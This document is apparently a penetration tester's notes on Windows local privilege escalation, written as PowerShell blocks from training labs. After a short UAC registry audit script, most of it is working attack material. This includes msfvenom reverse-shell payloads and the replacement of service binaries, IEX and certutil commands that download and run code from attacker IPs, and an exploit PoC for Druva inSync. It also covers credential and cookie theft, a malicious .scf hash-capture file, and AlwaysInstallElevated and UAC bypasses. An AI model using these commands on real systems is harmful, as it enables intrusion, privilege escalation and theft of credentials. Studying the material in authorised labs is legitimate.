    @{ Name = "FilterAdministratorToken"; SecureValue = 1; Desc = "UAC Admin Approval Mode for Built-in Admin" },
    @{ Name = "ConsentPromptBehaviorAdmin"; SecureValue = 2; Desc = "UAC Prompt Behavior for Administrators" },
    @{ Name = "ConsentPromptBehaviorUser"; SecureValue = 3; Desc = "UAC Prompt Behavior for Standard Users" },
    @{ Name = "PromptOnSecureDesktop"; SecureValue = 1; Desc = "Secure Desktop Enforcement (Screen Dimming)" },
    @{ Name = "EnableSecureUIAPaths"; SecureValue = 1; Desc = "Enforce UIAccess Apps to run only from secure paths" },
    @{ Name = "ValidateAdminCodeSignatures"; SecureValue = 1; Desc = "Enforce Digital Signatures for UAC Elevation" },
    @{ Name = "EnableInstallerDetection"; SecureValue = 1; Desc = "Heuristic detection of installation/setup files" },
    @{ Name = "LocalAccountTokenFilterPolicy"; SecureValue = 0; Desc = "Remote Local Admin token restriction (PtH defense)" }
)

foreach ($Policy in $Policies) {
    $Name = $Policy.Name
    $SecureVal = $Policy.SecureValue
    $Desc = $Policy.Desc
    
    # Query the Registry key value
    $CurrentVal = Get-ItemProperty -Path $RegPath -Name $Name -ErrorAction SilentlyContinue | Select-Object -KeepProperty $Name -ExpandProperty $Name -ErrorAction SilentlyContinue

    # Handle default Windows behaviors if the registry key doesn't explicitly exist
    if ($null -eq $CurrentVal) {
        if ($Name -eq "LocalAccountTokenFilterPolicy") { $CurrentVal = 0 }
        else { $CurrentVal = "Not Defined (Default Baseline)" }
    }

    # Evaluate risk based on the current configuration
    $Status = "SECURE / COMPLIANT"
    $Color = "Green"

    # Specific vulnerability logic mapping
    if ($Name -eq "EnableLUA" -and $CurrentVal -eq 0) { 
        $Status = "CRITICAL VULNERABILITY (UAC is completely disabled!)"
        $Color = "Red" 
    }
    elseif ($Name -eq "ConsentPromptBehaviorAdmin" -and $CurrentVal -eq 0) { 
        $Status = "HIGH RISK (Elevates privileges silently without prompt)"
        $Color = "Red" 
    }
    elseif ($Name -eq "PromptOnSecureDesktop" -and $CurrentVal -eq 0) { 
        $Status = "MEDIUM RISK (Secure Desktop disabled. Vulnerable to UI spoofing/automated clicks)"
        $Color = "Yellow" 
    }
    elseif ($Name -eq "LocalAccountTokenFilterPolicy" -and $CurrentVal -eq 1) { 
        $Status = "HIGH RISK (Remote Local Admin restrictions bypassed. Allows easy Pass-The-Hash)"
        $Color = "Red" 
    }
    elseif ($CurrentVal -ne $SecureVal -and $CurrentVal -ne "Not Defined (Default Baseline)") {
        if ($Name -eq "ConsentPromptBehaviorAdmin" -and $CurrentVal -eq 5) {
            $Status = "NORMAL / DEFAULT CONFIGURATION"
            $Color = "Gray"
        } else {
            $Status = "POTENTIAL RISK (Non-optimal configuration)"
            $Color = "Yellow"
```





# Permissive File System ACLs
```powershell
SharpUp.exe audit

icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
BUILTIN\Users:(I)(F)
Everyone:(I)(F)

# Creat Malicious System File
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f exe > SecurityService.exe

# Listener
nc -lvnp 4444

# Backup Original File
cd "C:\Program Files (x86)\PCProtect"
move SecurityService.exe SecurityService.exe.bak

# Download Malicious File
Invoke-WebRequest -Uri "http://10.10.14.3:8080/SecurityService.exe" -OutFile "C:\Program Files (x86)\PCProtect\SecurityService.exe"

# Service stop and restart
sc.exe stop SecurityService
sc.exe start SecurityService

# Cleanup
taskkill /F /IM SecurityService.exe
del SecurityService.exe
move SecurityService.exe.bak SecurityService.exe
sc start SecurityService
```

# Weak Permissions
```powershell
SharpUp.exe audit
=== SharpUp: Running Privilege Escalation Checks ===
=== Modifiable Services ===
  Name             : WindscribeService
  DisplayName      : WindscribeService
  Description      : Manages the firewall and controls the VPN tunnel
  State            : Running
  StartMode        : Auto
  PathName         : "C:\Program Files (x86)\Windscribe\WindscribeService.exe"

# Check Permissions
accesschk.exe /accepteula -quvcw WindscribeService

# Changing the Service Binary Path
sc.exe config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"

# Restart Service
sc.exe stop WindscribeService
sc.exe start WindscribeService

# Confirming Local Admin Group
net localgroup administrators
```

# Unquoted Service Path
```powershell
# Check Unquoted Service Path
Get-CimInstance Win32_Service | Where-Object {$_.StartMode -eq "Auto" -and $_.PathName -notlike '"*' -and $_.PathName -like '* *' -and $_.PathName -notlike '*C:\Windows\*'} | Select-Object Name, PathName

For Example:
C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe

# Querying Service
sc.exe qc SystemExplorerHelpService

# Create Payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=6666 -f exe > SystemExplorerService64.exe

# Stop / Start Service
sc.exe stop SystemExplorerService64.exe
sc.exe start SystemExplorerService64.exe
```

# Permissive Registry ACLs
```powershell
accesschk.exe /accepteula -kvuqsw "Users" hklm\System\CurrentControlSet\services
accesschk.exe /accepteula "<CURRENT_USERNAME>" -kvuqsw hklm\System\CurrentControlSet\services

RW HKLM\System\CurrentControlSet\services\ModelManagerService
        KEY_ALL_ACCESS or KEY_SET_VALUE ( Vulnerable )

# Check ImagePath
Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name ImagePath

# Set ImagePath
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
```

# Modifiable Registry Autorun Binary
```powershell
Get-CimInstance Win32_StartupCommand | Select-Object Name, Command, Location, User | Format-List
Name     : Windscribe
command  : "C:\Program Files (x86)\Windscribe\Windscribe.exe" -os_restart
Location : HKU\S-1-5-21-2374636737-2633833024-1808968233-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
User     : WINLPE-WS01\mrb3n

icacls "C:\Program Files (x86)\Windscribe\Windscribe.exe"

# Create Payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8888 -f exe > Windscribe.exe

# Rogue File
cd "C:\Program Files (x86)\Windscribe"
move Windscribe.exe Windscribe.exe.bak
certutil -urlcache -f http://10.10.14.3:8080/Windscribe.exe Windscribe.exe

WAIT FOR ADMIN SHELL!!!
```





# WESNG
```powershell
systeminfo > systeminfo.txt

python3 wes.py systeminfo.txt > exploits

cat exploits | grep Exploit
cat exploits.txt | grep CVE > exploit_CVE
cat fayl_adi.txt | awk '{print $2}' > exploit_CVEs.txt
```




# Enumerating Installed Programs
```powershell
wmic product get name
```

# Enumerating Local Ports
```powershell
netstat -ano | findstr 6064

get-process -Id 3324
Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    149      10     1512       6748              3324   0 inSyncCPHwnet64

get-service | ? {$_.DisplayName -like '*inSync*'}
```

# Automate Services Enumerate
```powershell
Get-NetTCPConnection | ForEach-Object {
    $procName = $null
    # PID vasitəsilə prosesin adını təhlükəsiz şəkildə öyrənirik (bağlanmış proseslərdə xəta verməməsi üçün)
    if ($_.OwningProcess -and (Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue)) {
        $procName = (Get-Process -Id $_.OwningProcess).ProcessName
    } else {
        $procName = "Unknown / Closed"
    }

    # Çıxış formatını nizamlayırıq
    [PSCustomObject]@{
        "Local Address"   = "$($_.LocalAddress):$($_.LocalPort)"
        "External Address"  = "$($_.RemoteAddress):$($_.RemotePort)"
        "Status"        = $_.State
        "PID"           = $_.OwningProcess
        "Process Name"    = $procName
    }
} | Out-GridView
```

# Enumerate Service
```powershell
$ServiceName = (Get-Service | Where-Object {$_.DisplayName -like "*inSync*"}).ServiceName
if ($ServiceName) {
    $RegPath = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$ServiceName").ImagePath
    $CleanPath = $RegPath -replace '"', ''
    if ($CleanPath -match "(.+?\.exe)") { $CleanPath = $Matches[1] }
    Write-Host "[+] Servis Fayl Yolu: $CleanPath" -ForegroundColor Green
    (Get-Item $CleanPath).VersionInfo | Format-List ProductVersion, FileVersion, FileName
} else {
    Write-Host "[-] Servis sistemdə tapılmadı." -ForegroundColor Red
}
```

# Search Service Vulnerabilities 
```powershell
Google Dorking:
Druva inSync 6.6.3 exploit
Druva inSync 6.6.3 vulnerability

msf > search <SERVICE_NAME>
```

# Listener
```powershell
Invoke-PowerShellTcp.ps1 faylının sonuna bunu yaz:
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.15.170 -Port 9000

python3 -m http.server 8080

$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.15.170:12000/Invoke-PowerShellTcp.ps1')"
```

# Proof of Concept
```powershell
$ErrorActionPreference = "Stop"

$cmd = "net user pwnd /add"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```

# Metasploit
```powershell
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.15.170
msf6 exploit(multi/handler) > set LPORT 9443
msf6 exploit(multi/handler) > run

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.170 LPORT=9443 -f exe -o shell.exe
```





# Application Configuration Files
```powershell
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
```

# Dictionary Files
```powershell
gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
```

# Automation
```powershell
Get-ChildItem -Recurse -Include *.txt, *.ini, *.cfg, *.config, *.xml -ErrorAction SilentlyContinue | Select-String -Pattern "password" | Select-Object Path, LineNumber, Line | Out-GridView
```

# Powershell History
```powershell
(Get-PSReadLineOption).HistorySavePath
C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history

gc (Get-PSReadLineOption).HistorySavePath

foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
```

# Powershell Credentials
```powershell
Admin:
$encryptedPassword = Import-Clixml -Path 'C:\scripts\pass.xml'
$decryptedPassword = $encryptedPassword.GetNetworkCredential().Password
Connect-VIServer -Server 'VC-01' -User 'bob_adm' -Password $decryptedPassword

Attacker:
$credential = Import-Clixml -Path 'C:\scripts\pass.xml'
$credential.GetNetworkCredential().username
$credential.GetNetworkCredential().password
```

# Sticky Notes
```powershell
Set-ExecutionPolicy Bypass -Scope Process

C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite

$db = 'C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'

Import-Module .\PSSQLite.psd1
Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap

strings plum.sqlite-wal
```





# Cmdkey Saved Credentials
```powershell
cmdkey /list
Target: LegacyGeneric:target=TERMSRV/SQL01
    Type: Generic
    User: inlanefreight\bob

runas /savecred /user:inlanefreight\bob "COMMAND HERE"
```

# Browser Credential
```powershell
.\SharpChrome.exe logins /unprotect
```

# Password Managers
```powershell
Get-ChildItem -Path C:\ -Include *.kdbx, *.opvault, *CyberArk* -Recurse -ErrorAction SilentlyContinue | Select-Object FullName

python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx
hashcat -m 13400 keepass_hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt
```

# Email
```powershell
https://github.com/dafthack/MailSniper
```

# LaZagne
```powershell
.\lazagne.exe all
```

# SessionGopher
```powershell
https://github.com/Arvanaghi/SessionGopher

Import-Module .\SessionGopher.ps1
Invoke-SessionGopher -Target WINLPE-SRV01
```

# Windows AutoLogon
```powershell
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | Select-Object AutoAdminLogon, DefaultUserName, DefaultPassword

    AutoAdminLogon    REG_SZ    1
    DefaultUserName    REG_SZ    htb-student
    DefaultPassword    REG_SZ    HTB_@cademy_stdnt!
```

# Putty
```powershell
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions

reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
```

# Wifi Password
```powershell
netsh wlan show profile

netsh wlan show profile <SSID_NAME> key=clear
```






# Escape with Paint
```powershell
Save --> Open

\\127.0.0.1\c$\users\pmorgan
```

# Accessing SMB share from restricted environment
```powershell
smbserver.py -smb2support share $(pwd)

New-PSDrive -Name "Z" -PSProvider FileSystem -Root "\\10.13.38.95\share"
net use Z: \\10.13.38.95\share

Copy-Item "\\10.13.38.95\share\pwn.exe" -Destination "C:\Users\pmorgan\Desktop\"

Explorer++
```

# Alternate Registry Editors
```powershell

```

# Modify existing shortcut file
```powershell
Shortcut Programs --> Rights --> Rights Click --> Target ( C:\Windows\System32\cmd.exe )
```

# Script Execution
```powershell
BAT:
@echo off
cmd.exe

VBS:
Set objShell = CreateObject("WScript.Shell")
objShell.Run "cmd.exe", 1, True

PS1:
Start-Process cmd.exe
```

# Escalation Privileges
```powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
        AlwaysInstallElevated    REG_DWORD    0x1

powershell -ep bypass
Import-Module .\PowerUp.ps1
Write-UserAddMSI

backdoor:T3st@123

runas /user:backdoor cmd
```

# Bypassing UAC
```powershell
powershell -ep bypass
Import-Module .\Bypass-UAC.ps1
Bypass-UAC -Method UacMethodSysprep
```





# Traffic Capture
```powershell



```

# Process Command Lines
```powershell
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}

Procmon.ps1

IEX (iwr 'http://10.10.10.205/procmon.ps1') 
```

# Poisining Attacks
### [LLMNR-NBTNS-mDNS Poisining](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/LLMNR-NBTNS-mDNS-Poisining.md)


# Capturing Hashes with a Malicious .scf File
```powershell
sudo responder -I eth0 -dwv

PS C:\Tools> net share
Share name   Resource                        Remark
-------------------------------------------------------------------------------
C$           C:\                             Default share
IPC$                                         Remote IPC
ADMIN$       C:\Windows                      Remote Admin
Department Shares  C:\Department Shares

@Inventory.scf:
[Shell]
Command=2
IconFile=\\\\<ATTACKER_IP>@<PORT>\\share\\legit.ico
[Taskbar]
Command=ToggleDesktop

hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```






# Installed Applications
```powershell
$INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayName, DisplayVersion, InstallLocation
$INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation
$INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize
```

# mRemoteNG
```powershell
C:\Users\julio\AppData\Roaming\mRemoteNG
confCons.xml:
Password="sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig=="

python3 mremoteng_decrypt.py -s "sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig==" 
```

# Firefox Cookie Extraction
```powershell
Firefox: C:\Users\<Sizin_İstifadəçi_Adınız>\AppData\Roaming\Mozilla\Firefox\Profiles\<təsadüfi_simvollar>.default-release\cookies.sqlite
python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d

Cookie: (201, '', 'd', 'xoxd-CJRafjAvR3UcF%2FXpCDOu6xEUVa3romzdAPiVoaqDHZW5A9oOpiHF0G749yFOSCedRQHi%2FldpLjiPQoz0OXAwS0%2FyqK5S8bw2Hz%2FlW1AbZQ%2Fz1zCBro6JA1sCdyBv7I3GSe1q5lZvDLBuUHb86C%2Bg067lGIW3e1XEm6J5Z23wmRjSmW9VERfce5KyGw%3D%3D', '.slack.com', '/', 1974391707, 1659379143849000, 1658439420528000, 1, 1, 0, 1, 1, 2)

Cookie Editor
```

# Chrome Cookie Extraction
```powershell
https://github.com/djhohnstein/SharpChromium/blob/master/ChromiumCredentialManager.cs#L47

copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"
Invoke-SharpChromium -Command "cookies slack.com"
```

# Monitor Clipboard
```powershell
https://github.com/inguardians/Invoke-Clipboard/blob/master/Invoke-Clipboard.ps1

Invoke-ClipboardLogger
```

# Initialize Backup Directory
```powershell
mkdir E:\restic; restic.exe -r E:\restic init
$env:RESTIC_PASSWORD = 'Superbackup!'

# List Snapshots
restic.exe -r E:\restic\ snapshots

# Check Snapshots
restic.exe -r E:\restic\ ls b2f5caa0

# Extraction Critical files
# SAM və SECURITY fayllarının çıxarılması:
restic.exe -r E:\restic\ restore b2f5caa0 --target C:\Extraction --include /C/Windows/System32/config/SAM --include /C/Windows/System32/config/SECURITY --include /C/Windows/System32/config/SYSTEM

# Read Hashes
impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM local
```





# Living Off The Land Binaries and Scripts (LOLBAS)
```powershell
https://lolbas-project.github.io/
```

# Transferring File with Certutil
```powershell
certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat

# Encoding File with Certutil
certutil -encode file1 encodedfile

# Decoding File with Certutil
certutil -decode encodedfile file2
```

# Always Install Elevated
```powershell
Computer Configuration\Administrative Templates\Windows Components\Windows Installer
User Configuration\Administrative Templates\Windows Components\Windows Installer

reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

# Generating MSI Package
```powershell
msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi

# Executing MSI Package
msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart

# Catching Shell
nc -lnvp 9443
```

# Scheduled Tasks
```powershell
C:\Windows\System32\Tasks

schtasks /query /fo LIST /v
Get-ScheduledTask | select TaskName,State
```

# Checking Permissions Directory
```powershell
.\accesschk64.exe /accepteula -s -d C:\Scripts\
```

# User/Computer Description Field
```powershell
Get-LocalUser

Get-WmiObject -Class Win32_OperatingSystem | select Description
```

# Mount VHDX/VMDK
```powershell
Snaffler.exe -d domain.local -s -v info -o snaffler_results.txt

guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk

guestmount --add WEBSRV10.vhdx  --ro /mnt/vhdx/ -m /dev/sda1

File --> Map Virtual Disks
```

# Retrieving Hashes using Secretsdump.py
```powershell
secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
```





# Querying Current Patch Level
```powershell
wmic qfe
```

# Running Sherlock
```powershell
Set-ExecutionPolicy bypass -Scope process

Import-Module .\Sherlock.ps1
Find-AllVulns
```

# Metasploit
```powershell
msf6 exploit(windows/smb/smb_delivery) > search smb_delivery

set ForceExploit true
```
